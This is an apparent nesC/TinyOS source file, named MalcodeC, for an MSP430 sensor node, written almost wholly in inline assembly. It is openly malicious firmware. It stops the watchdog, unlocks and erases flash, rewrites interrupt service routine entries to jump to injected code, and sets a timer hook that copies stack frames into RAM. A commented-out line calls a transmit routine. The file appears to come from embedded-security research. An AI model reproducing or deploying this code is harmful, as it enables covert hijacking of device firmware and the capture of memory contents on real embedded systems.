#define QUAUX(X) #X
#define QU(X) QUAUX(X)

module MalcodeC {
    uses {
        interface Boot;
    }
}
implementation {

    void setupEngine() __attribute__((noinline)) {
        asm("PUSH R15");
        asm("PUSH R14");
        asm("MOV.B #0, &0x2000");
        asm("MOV &0xfff2, R14");
        asm("MOV #" QU(ADDRst) ", R15");
        asm("CALL #" QU(ADDRisri));
        asm("MOV &0xfff8, R14");
        asm("MOV #" QU(ADDRfe) ", R15");
        asm("CALL #" QU(ADDRisri));
        asm("POP R14");
        asm("POP R15");
        asm("BR #" QU(ADDRrestore));
    }

    void stackTracer() __attribute__((noinline)) {
        asm("PUSH R15");
        asm("PUSH R14");
        asm("CMP.B #" QU(PARAMruns) ", &0x2000");
        asm("JZ endST");
        asm("BIT #0x10, &0x018e");
        asm("JC endST");
        asm("MOV.B #0, &0x2001");
        asm("MOV #0, &0x2002");
        asm("MOV #" QU(PARAMperiod) ", &0x0192");
        asm("MOV #0x0010, &0x018e");
        asm("CLR &0x0190");
        asm("MOV #0x1910, &0x0180");
        asm("endST:");
        asm("MOV &0xfff2, R15");
        asm("ADD #0x0004, R15");
        asm("BR R15");
    }

    void frameExtractor() __attribute__((noinline)) {
        asm("PUSH R15");
        asm("PUSH R14");
        asm("PUSH R13");
        asm("CMP.B #0x0C, &0x011e");
        asm("JNC endFE");
        asm("BIT.B #0x04, &0x001D");
        asm("JNC endFE");
        asm("MOV #" QU(ADDRtmp) ", R13");
        asm("ADD &0x2002, R13");
        asm("MOV R1, R14");
        asm("MOV R1, R15");
        asm("ADD #0x000A, R14"); // ignore first 10 bytes (SR, PC, 3xPUSH)
        asm("ADD #0x000A, R15");
        asm("ADD #" QU(PARAMrg) ", R15");
        asm("MOV @R14+, 0x0000(R13)");
        asm("INCD R13");
        asm("CMP R14, R15");
        asm("JNZ -0xA");
        asm("INC.B &0x2001"); // increment captures
        asm("ADD #" QU(PARAMrg) ", &0x2002"); // increment offset
        asm("CLR &0x0190"); // reset TBR (to discard time occupied by the FE)
        asm("CMP.B #" QU(PARAMcaptures) ", &0x2001");
        asm("JNZ 0x8");
        asm("MOV #0, &0x018E");
        asm("INC.B &0x2000"); // increment runs
        //asm("CALL #2000"); // CALL #ADDRtransmit (4 bytes)
        asm("endFE:");
        asm("MOV &0xfff8, R15");
        asm("ADD #0x0004, R15");
        asm("POP R13");
        asm("BR R15");
    }

    void isrInjector() __attribute__((noinline)) {
        asm("PUSH R2");
        asm("PUSH R13");
        asm("PUSH R12");
        asm("PUSH R11");
        asm("PUSH R10");
        asm("MOV #0x5a80, &0x0120"); // stop watchdog
        asm("MOV.B R14, R13");
        asm("SWPB R14");
        asm("MOV.B R14, R12");
        asm("MOV.B R12, R11");
        asm("AND.B #0x01, R11");
        asm("TST.B R11");
        asm("JZ 0x6");
        asm("DEC.B R12");
        asm("ADD #0x0100, R13");
        asm("ADD #" QU(ADDRtmp) ", R13");
        asm("SWPB R12");
        asm("MOV R12, R11");
        asm("ADD #0x0200, R11"); // flash segment end = flash segment start + 512 bytes
        asm("MOV #" QU(ADDRtmp) ", R10"); // segment destination in RAM
        asm("MOV R12, R14"); // copy start of flash segment
        asm("MOV @R14+, 0x0000(R10)");
        asm("INCD R10");
        asm("CMP R14, R11"); // check if end of flash segment
        asm("JNZ -0xA");
        asm("MOV #0x4030, 0x0000(R13)"); // replace PUSH with BR
        asm("MOV R15, 0x0002(R13)"); // replace PUSH with callback address
        asm("MOV #0xa542, &0x012a"); // FCTL2 - MCLK/3 for Flash Timing Generator
        asm("MOV #0xa502, &0x0128"); // FCTL1 - set ERASE bit
        asm("MOV #0xa500, &0x012c"); // FCTL3 - remove LOCK bit
        asm("CLR 0x0000(R12)"); // erase segment
        asm("BIT #0x0008, &0x012c"); // check write status
        asm("JZ -0x6"); // loop until write is done
        asm("MOV #" QU(ADDRtmp) ", R10"); // start of RAM segment
        asm("MOV #0xa540, &0x0128"); // FCTL1 - set WRT bit
        asm("MOV @R10+, 0x0000(R12)"); // write word
        asm("INCD R12");
        asm("BIT #0x0001, &0x012c"); // check busy status
        asm("JNZ -0x6"); // loop until not busy
        asm("CMP R12, R11"); // check if end of flash segment
        asm("JNZ -0x10");
        asm("MOV #0xa500, &0x0128"); // FCTL1 - remove WRT bit
        asm("MOV #0xa510, &0x012c"); // FCTL3 - set LOCK bit (lock flash controller)
        asm("POP R10");
        asm("POP R11");
        asm("POP R12");
        asm("POP R13");
        asm("POP R2"); // SR
        asm("RET");
    }

    event void Boot.booted() {
        setupEngine();
        stackTracer();
        frameExtractor();
        isrInjector();
    }
}
